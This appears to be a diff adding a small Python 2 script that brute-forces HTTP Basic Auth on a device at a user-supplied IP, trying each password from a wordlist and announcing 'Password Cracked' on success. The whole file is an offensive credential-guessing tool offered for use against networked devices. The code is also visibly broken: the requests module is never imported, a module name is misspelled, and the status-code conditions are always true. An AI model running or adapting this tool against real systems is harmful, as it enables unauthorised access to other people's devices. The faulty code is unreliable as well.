@@ -1,0 +1,35 @@
+import time
+import fontstyles 
+try:
+  from requests.auth import HTTPBasicAuth
+except ImportError:
+   print "Please Install the requests module!" 
+def hello():
+    print "Bruteforcer loaded." 
+    ip = raw_input("Enter the IP of the device: ") 
+    username = raw_input("Username to use: ")     
+    wlist = raw_input("Wordlist to use: ")  
+    try:
+      wlist = open(wlist, 'r').readlines()
+    except:
+      print "Wordlist Not Found!"
+      quit()
+    for passw in wlist:
+         try:
+
+            print "Testing password:", passw
+            r = requests.get("http://" + ip, auth=HTTPBasicAuth(username, passw))
+            if r.status_code == 400 or 401:
+               print fonstyles.messages.error + " Wrong password:",passw
+            if r.status_code == 200 or 202 and r.status_code != 400 or 401:
+               print fontstyles.messages.positive + "Password Cracked:", passw
+               quit() 
+                    
+         except KeyboardInterrupt:
+               print "Exiting..." 
+               time.sleep(1)
+               quit()
+         except:
+               print "An Error Occured" 
+               quit() 
+hello()
